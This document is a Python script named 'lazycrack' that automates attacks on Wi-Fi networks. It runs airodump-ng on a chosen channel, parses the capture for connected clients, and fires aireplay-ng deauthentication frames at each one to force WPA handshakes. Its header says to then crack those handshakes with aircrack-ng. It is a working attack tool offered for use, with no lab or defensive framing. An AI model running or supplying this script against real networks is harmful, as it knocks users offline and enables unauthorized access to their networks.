#!/usr/bin/env python

# written by Jon Henningsson
# http://fattigjon.se

# usage: first, enable a monitor interface with airmon-ng
# run this script with the appropriate options
# finally, run aircrack-ng 

import subprocess
import time
import datetime
from optparse import OptionParser


parser = OptionParser()
parser.add_option("-f", "--file", dest="FNAME",
		                  help="airodump output filename", type="string", action="store", metavar="FILE")
parser.add_option("-c", "--channel", dest="CHANNEL",
		                  help="scanning channel", type="int", action="store", metavar="CHANNEL")
parser.add_option("-i", "--interface", dest="MON_IFACE",
		                  help="monitor interface", type="string", action="store", metavar="IFACE")
parser.add_option("-d", "--duration", dest="DURATION",
		                  help="duration in seconds for collecting data, default is 30", type="int", action="store", metavar="DURATION")
(option, args) = parser.parse_args()


def log_start():
	try:
		global f
		f = open('lazycrack.log', 'a', 1)
		f.write(str(datetime.datetime.now()) + '\n')
	except IOError:
		print("Could not open logfile! Exiting..")
		exit(1)


def check_opts():
	if option.FNAME == None or option.MON_IFACE == None\
			or option.CHANNEL == None:
		print("Please specify options! Exiting..")
		f.write("Please specify options! Exiting..\n")
		exit(1)


def check_user():
	try:
		user = subprocess.check_output(["whoami"])
		user = str(user.strip())
		if user == "b'root'":
			print("You are root. Excellent.")
			return True
		else:
			print("Please run as root! Exiting..")
			return False
	except OSError:
		print("Could not verify user. Is this a Linux system?")
		f.write("Could not verify user. Is this a Linux system?\n")
		exit(1)

def cleanup():
	cleanup_args1 = ['killall', 'airodump-ng']
	p1 = subprocess.Popen(cleanup_args1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
	cleanup_args2 = ['killall', 'aireplay-ng', '&>', '/dev/null']
	p2 = subprocess.Popen(cleanup_args2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
	f.write("-------------------------------------\n")
	f.close()


def start_airodump(mon_iface, channel, fname, duration):
	try:
		if duration == None or duration < 2:
			duration = 30
		f.write("Collecting data for {} seconds..".format(str(duration)) + '\n')
		time.sleep(2)
		airodump_values = ['airodump-ng', '-c', str(channel), '-w', fname, mon_iface]
		try:
			p1 = subprocess.Popen(airodump_values)
			time.sleep(1)
			if p1.poll() == None:
				logtext = ("Started airodump-ng with PID " + str(p1.pid))
				values_str = ' '.join(airodump_values)
				f.write(logtext + ': ' + values_str + '\n')
			else:
				raise Exception('lel')
			
			time.sleep(duration/2)
			parse_inject()
			time.sleep(duration/2)
			p1.kill()
			f.write('Done. Exiting..' + '\n')

		except KeyboardInterrupt:
			print("Aborting..")
			p1.kill()
			cleanup()
			exit(1)
		except:
			print("Could not start airodump-ng!")
			f.write("Could not start airodump-ng!\n")
			f.write("Aborting..\n")
			print("Aborting..")
			cleanup()
			exit(1)
	except KeyboardInterrupt:
		print("Aborting..")
		f.write("Aborting..\n")
		p1.kill()
		cleanup()
		exit(1)
	return p1


def start_aireplay(ap_mac, station_mac, mon_iface):
	try:
		logtext = ("Injecting frame into client " + str(station_mac) + ' : ')
		f.write(logtext)
		aireplay_values = ['aireplay-ng', '-0', '1', '-a', ap_mac, '-c', station_mac, '--ignore-negative-one', mon_iface]
		p1 = subprocess.Popen(aireplay_values, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
		values_str = ' '.join(aireplay_values)
		f.write(values_str + '\n')
	except KeyboardInterrupt:
		print("Aborting..")
		f.write("Aborting..")
		p1.kill()
		cleanup()
		exit(1)
	return True

def parse_inject():
	f = open(option.FNAME + '-01.csv', 'r')
	f_data = f.readlines()
	f.close()
	f_data = f_data[2:]
	del f_data[-1]

	ap_macs = []
	station_macs = {}

	i = 0
	for line in f_data:
		f_data_temp = line.split(',')
		if f_data_temp[0].strip() == '':
			del f_data[:i]
		else:
			ap_macs.append(f_data_temp[0])
			i=i+1

	f_data = f_data[2:]
	for line in f_data:
		f_data_temp = line.split(',')
		station_macs[f_data_temp[0]] = f_data_temp[5].strip()

	for mac in station_macs:
		if station_macs[mac] in ap_macs:
			start_aireplay(station_macs[mac], mac, option.MON_IFACE)
			time.sleep(1)


###### MAIN ######
if not check_user(): # check if user is root
	exit(1)

log_start()
check_opts() # check options
start_airodump(option.MON_IFACE, option.CHANNEL, option.FNAME, option.DURATION)
cleanup()
